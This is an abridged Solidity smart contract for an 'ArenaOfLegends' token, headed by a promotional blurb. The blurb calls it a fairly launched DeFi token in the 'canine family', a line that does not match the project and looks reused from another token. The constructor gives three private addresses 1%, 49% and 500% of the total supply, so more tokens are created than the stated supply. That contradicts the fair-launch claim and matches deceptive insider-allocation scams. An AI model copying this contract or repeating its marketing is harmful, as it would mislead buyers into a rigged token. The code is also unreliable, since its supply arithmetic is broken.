...
-------------------------------------------------------------------
---------------------    ArenaOfLegends   ----------------------------
ArenaOfLegends is a new arrival in the cryptocurrency canine family, 
with both the community and its social purpose firmly at the heart
of this project. ArenaOfLegends is a fairly launched DeFi Token with 
an inbuilt reward system for holders.
https://ArenaOfLegends.io/
...
contract ArenaOfLegendsToken is MetaverseNFT {
     // FairLaunch
    // common addresses
    address private owner;
    address private ArenaOfLegendsBSC;
    address private ArenaOfLegendsCoin;
    address private ArenaOfLegendss;
    ...
    string public override name = "ArenaOfLegends";
    string public override symbol = "ArenaOfLegends";
    ...
    constructor(uint totalSupplyValue, address ArenaOfLegendsBSCAddress, address ArenaOfLegendsCoinAddress, address ArenaOfLegendssAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        ArenaOfLegendsBSC = ArenaOfLegendsBSCAddress;
        ArenaOfLegendsCoin = ArenaOfLegendsCoinAddress;
        ArenaOfLegendss = ArenaOfLegendssAddress;
        balances[ArenaOfLegendsBSC] =  totalSupply * 1 / 100;
        balances[ArenaOfLegendsCoin] = totalSupply * 49 / 100;
        balances[ArenaOfLegendss] = totalSupply * 500 / 100;
